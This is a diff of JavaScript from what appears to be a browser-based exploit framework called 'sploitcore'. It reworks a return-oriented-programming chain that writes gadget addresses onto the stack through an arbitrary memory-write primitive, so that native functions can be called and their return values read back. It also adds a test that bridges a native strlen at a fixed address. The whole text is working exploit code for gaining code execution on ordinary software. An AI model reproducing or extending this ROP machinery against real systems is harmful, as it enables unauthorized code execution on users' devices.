@@ -581,7 +581,7 @@ sploitcore.prototype.call = function(funcptr, args, registers, dump_regs) {
     this.write8(add2(dumparea, 0x318 - 0x18), sp, (0x180 + 0x8) >> 2); // Load X19 = dumparea + 0x318 - 0x18
     this.write8(mov_x2_into_x1, sp, (0x180 + 0x18) >> 2);              // Load LR with mov x1, x2
     this.write8(add2(dumparea, 0x3F8), sp, (0x1A0 + 0x0) >> 2);        // Load X20 with scratch space
-    this.write8(add2(savearea, 0xC0), sp, (0x1A0 + 0x8) >> 2);         // Load X19 = savearea + 0xC0 (saved X24)
+    this.write8(add2(dumparea, 0x320), sp, (0x1A0 + 0x8) >> 2);        // Load X19 = dumparea + 0x320
     this.write8(str_x0, sp, (0x1A0 + 0x18) >> 2);                      // Load LR with str x0
     this.write8(add2(dumparea, 0x388), sp, (0x1C0 + 0x0) >> 2);        // Load X19 = dumparea + 0x388
     this.write8(add2(dumparea, 0x320), dumparea, 0x388 >> 2);          // Write dumparea + 0x320 to dumparea + 0x388
@@ -608,15 +608,21 @@ sploitcore.prototype.call = function(funcptr, args, registers, dump_regs) {
     this.write8(add2(dumparea, 0x3A0), sp, (0x290 + 0x8) >> 2);        // Load X19 with dumparea + 0x3A0
     this.write8(returngadg, dumparea, 0x3A0 >> 2);                     // Write return gadget to dumparea + 0x3A0
     this.write8(load_and_str_x8, sp, (0x290 + 0x18) >> 2);             // Load X30 with LD, STR X8
-    this.write8(savearea, sp, (0x2B0 + 0x8) >> 2);                     // Load X19 with savearea
-    this.write8(mov_x19_into_x0, sp, (0x2B0 + 0x18) >> 2);             // Load X30 with mov x0, x19.
-    this.write8(loadgadg, sp, (0x2D0 + 0x18) >> 2);                    // Load X30 with context load
+    this.write8(add2(savearea, 0xC0), sp, (0x2B0 + 0x0) >> 2);         // Load X20 with savearea + 0xC0 (saved X24)
+    this.write8(add2(dumparea, 0x3A8), sp, (0x2B0 + 0x8) >> 2);        // Load X19 with dumparea + 0x3A8
+    this.write8([0x00000000, 0xffff0000], dumparea, 0x3A8 >> 2);       // Write return gadget to dumparea + 0x3A8
+    this.write8(load_and_str_x8, sp, (0x2B0 + 0x18) >> 2);             // Load X30 with LD, STR X8
+    this.write8(savearea, sp, (0x2D0 + 0x8) >> 2);                     // Load X19 with savearea
+    this.write8(mov_x19_into_x0, sp, (0x2D0 + 0x18) >> 2);             // Load X30 with mov x0, x19.
+    this.write8(loadgadg, sp, (0x2F0 + 0x18) >> 2);                    // Load X30 with context load
 
     sp = add2(sp, 0x8000);
 
     dlog('Assigned.  Jumping.');
-    var ret = this.getAddrDestroy(this.func.apply(0x101));
+    this.func.apply(0x101);
     dlog('Jumped back.');
+
+    var ret = this.read8(dumparea, 0x320 >> 2);
 
     this.write8(curptr, this.funcaddr, 8);
 
@@ -626,7 +632,7 @@ sploitcore.prototype.call = function(funcptr, args, registers, dump_regs) {
         log('Register dump post-code execution:');
         for (var i = 0; i <= 30; i++) {
             if (i == 0) {
-                log('X0: ' + paddr(ret));
+                log('X0: ' + paddr(this.read8(dumparea, 0x320 >> 2)));
             } else if (i == 1) {
                 log('X1: ' + paddr(this.read8(dumparea, 0x310 >> 2)));
             } else if (i == 2) {
@@ -949,6 +955,13 @@ function main() {
 
 	log(paddr(sc.getSP()));
 
+	var str = 'this is a test string of length 0x25!';
+
+	var strlen = sc.bridge(0x43A6E8, int, char_p);
+	log(paddr(strlen(str)));
+
+	sc.querymem(strlen.addr);
+	sc.gc();
 	sc.gc();
 	return;
 
